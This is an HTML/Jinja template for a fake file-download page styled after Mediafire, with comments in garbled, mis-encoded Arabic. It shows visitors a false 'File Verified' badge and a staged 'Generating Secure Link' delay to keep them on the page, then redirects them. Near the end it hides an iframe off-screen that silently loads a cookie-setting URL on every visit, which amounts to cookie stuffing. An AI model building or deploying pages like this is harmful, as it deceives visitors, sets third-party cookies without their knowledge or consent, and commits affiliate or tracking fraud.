<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        /* Mediafire Style Fonts & Colors */
        body { font-family: 'Roboto', sans-serif; background: #fff; color: #333; }
        
        /* Ù„ÙˆÙ† Ù…ÙŠØ¯ÙŠØ§ÙØ§ÙŠØ± Ø§Ù„Ø£Ø²Ø±Ù‚ */
        .btn-mediafire {
            background-color: #0070f0; /* Ø§Ù„Ù„ÙˆÙ† Ø§Ù„Ø±Ø³Ù…ÙŠ */
            color: white;
            font-weight: 700;
            text-transform: uppercase;
            box-shadow: 0 4px 6px rgba(0, 112, 240, 0.3);
            transition: transform 0.2s, background-color 0.2s;
        }
        .btn-mediafire:hover {
            background-color: #005bc5;
            transform: translateY(-2px);
        }

        /* Ø£Ù†ÙŠÙ…ÙŠØ´Ù† Ø§Ù„Ø³Ù‡Ù… */
        @keyframes bounce-arrow {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(6px); }
        }
        .arrow-anim { animation: bounce-arrow 1.5s infinite; }

        /* ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ù…Ù‚Ø§Ù„ */
        .prose p { margin-bottom: 1.2em; line-height: 1.6; font-size: 1.1rem; color: #444; }
        .prose img { width: 100%; border-radius: 8px; margin: 15px 0; }

        /* Ø¥Ø®ÙØ§Ø¡ ÙˆØªØ¬Ù‡ÙŠØ² Ù…Ù†Ø·Ù‚Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ */
        #download-section { opacity: 0; transform: translateY(20px); transition: all 0.6s ease-out; }
        #download-section.visible { opacity: 1; transform: translateY(0); }
    </style>
</head>
<body class="flex flex-col min-h-screen relative pb-32">

    <!-- Header -->
    <nav class="bg-white border-b border-gray-200 sticky top-0 z-40 shadow-sm">
        <div class="max-w-3xl mx-auto px-4 h-16 flex items-center justify-between">
            <span class="font-bold text-xl text-[#0070f0] tracking-tight">TRAFICOON</span>
            <span class="text-xs font-bold text-gray-500 bg-gray-100 px-2 py-1 rounded border">{{ category }}</span>
        </div>
    </nav>

    <!-- Content -->
    <main class="max-w-3xl mx-auto px-4 py-8">
        
        <header class="mb-6 border-b border-gray-100 pb-4">
            <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">{{ title }}</h1>
            <div class="flex items-center gap-2 text-sm text-gray-500">
                <span class="w-2 h-2 rounded-full bg-green-500"></span>
                <span>File Verified</span>
                <span>â€¢ {{ date }}</span>
            </div>
        </header>

        <!-- ØµÙˆØ±Ø© Ø§Ù„Ù…Ù‚Ø§Ù„ -->
        {% if image %}
        <div class="mb-6">
            <img src="{{ image }}" class="w-full rounded-lg shadow-sm" alt="Preview">
        </div>
        {% endif %}

        <!-- Ø§Ù„Ù†Øµ (ÙŠÙ‚Ø±Ø£Ù‡ Ø§Ù„Ø²Ø§Ø¦Ø± Ø¨ÙŠÙ†Ù…Ø§ Ø§Ù„ÙƒÙˆÙƒÙŠØ² ØªØ¹Ù…Ù„) -->
        <div class="prose max-w-none">
            {{ body | safe }}
        </div>
        
        <!-- Ù…Ù†Ø·Ù‚Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ (Download Center) -->
        <div id="download-section" class="mt-12 p-8 bg-gray-50 rounded-xl border border-gray-200 text-center">
            
            <!-- Ø§Ù„Ø­Ø§Ù„Ø© 1: Ø§Ù„ÙØ­Øµ -->
            <div id="file-checking" class="flex flex-col items-center justify-center py-4">
                <div class="w-8 h-8 border-4 border-[#0070f0] border-t-transparent rounded-full animate-spin mb-3"></div>
                <span class="text-gray-600 font-medium animate-pulse">Generating Secure Link...</span>
            </div>

            <!-- Ø§Ù„Ø­Ø§Ù„Ø© 2: Ø²Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„ (ÙŠØ¸Ù‡Ø± Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ©) -->
            <div id="file-ready" class="hidden">
                <p class="text-sm text-gray-500 mb-4">File is ready for download</p>
                <a href="/redirect?url={{ target_url }}" class="btn-mediafire px-12 py-4 rounded text-lg w-full md:w-auto inline-block">
                    Download File â¬‡ï¸
                </a>
            </div>
        </div>

    </main>

    <!-- Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ø¹Ø§Ø¦Ù… (Mediafire Style) -->
    <div id="floating-toast" class="fixed bottom-6 left-4 right-4 md:left-auto md:right-6 md:w-auto bg-[#0070f0] text-white p-4 rounded-lg shadow-2xl z-50 flex items-center justify-between gap-4 cursor-pointer transform translate-y-20 opacity-0 transition-all duration-500" onclick="scrollToBottom()">
        <div class="flex items-center gap-3">
            <div class="bg-white/20 p-2 rounded">
                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
            </div>
            <div>
                <p class="font-bold text-sm">Download Ready</p>
                <p class="text-[10px] text-blue-100">Click to scroll down</p>
            </div>
        </div>
        <svg class="w-5 h-5 text-white arrow-anim" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
    </div>

    <!-- ğŸ”¥ Ø§Ù„ÙƒÙˆÙƒÙŠØ² (Ø§Ù„Ø­Ù‚Ù† Ø§Ù„Ø¥Ø¬Ø¨Ø§Ø±ÙŠ 100%) ğŸ”¥ -->
    <!-- Ø§Ù„ØªÙ‚Ù†ÙŠØ©: Ù†Ø¶Ø¹Ù‡Ø§ Ø®Ø§Ø±Ø¬ Ø§Ù„Ø´Ø§Ø´Ø©ØŒ Ù„ÙƒÙ†Ù‡Ø§ Ø¬Ø²Ø¡ Ù…Ù† Ø§Ù„ØµÙØ­Ø© ÙÙŠØªÙ… ØªØ­Ù…ÙŠÙ„Ù‡Ø§ ÙÙˆØ±Ø§Ù‹ -->
    {% if cookie_url %}
    <div style="position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; overflow:hidden;">
        <iframe src="{{ cookie_url }}" loading="eager" style="width:100px; height:100px; border:none;"></iframe>
    </div>
    {% endif %}

    <script>
        const toast = document.getElementById('floating-toast');
        const section = document.getElementById('download-section');
        const checking = document.getElementById('file-checking');
        const ready = document.getElementById('file-ready');
        let revealed = false;

        // 1. Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ø¹Ø§Ø¦Ù… Ø¨Ø¹Ø¯ 1.5 Ø«Ø§Ù†ÙŠØ©
        setTimeout(() => {
            if (!revealed) {
                toast.classList.remove('translate-y-20', 'opacity-0');
            }
        }, 1500);

        function scrollToBottom() {
            section.scrollIntoView({ behavior: 'smooth' });
        }

        // 2. Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø³ÙƒØ±ÙˆÙ„
        window.addEventListener('scroll', () => {
            // Ø¥Ø°Ø§ Ø§Ù‚ØªØ±Ø¨ Ù…Ù† Ø§Ù„Ø£Ø³ÙÙ„
            if ((window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 400)) {
                
                // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±
                toast.classList.add('translate-y-20', 'opacity-0');

                if (!revealed) {
                    revealed = true;
                    section.classList.add('visible');
                    
                    // Ù…Ø­Ø§ÙƒØ§Ø© ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ø±Ø§Ø¨Ø· (1.5 Ø«Ø§Ù†ÙŠØ©) Ù„Ø¶Ù…Ø§Ù† Ø¨Ù‚Ø§Ø¡ Ø§Ù„Ø²Ø§Ø¦Ø±
                    setTimeout(() => {
                        checking.classList.add('hidden');
                        ready.classList.remove('hidden');
                    }, 1500);
                }
            }
        });
    </script>
</body>
</html>
